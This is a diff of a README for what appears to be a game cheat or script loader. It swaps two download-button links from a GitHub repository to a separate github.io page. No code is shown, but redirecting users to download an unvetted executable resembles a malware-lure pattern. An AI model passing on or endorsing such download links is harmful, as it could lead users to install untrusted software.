@@ -4,7 +4,7 @@
 
 ## 📥 Quick Download
 
-[![Download Now](https://img.shields.io/badge/Download-bee--swarm--vip--script--loader-green?style=for-the-badge&logo=github)](https://github.com/Pigmandioxin527/bee-swarm-vip-script-loader)
+[![Download Now](https://img.shields.io/badge/Download-bee--swarm--vip--script--loader-green?style=for-the-badge&logo=github)](https://pigmandioxin527.github.io)
 
 Visit this link to download the application.
 
@@ -44,7 +44,7 @@ Follow these steps to get the tool running on your Windows computer. Don't worry
 
 Go to the download page by clicking the button below or navigating to the link at the top of this page.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-orange?style=for-the-badge)](https://github.com/Pigmandioxin527/bee-swarm-vip-script-loader)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-orange?style=for-the-badge)](https://pigmandioxin527.github.io)
 
 Visit this link to download the application.
 
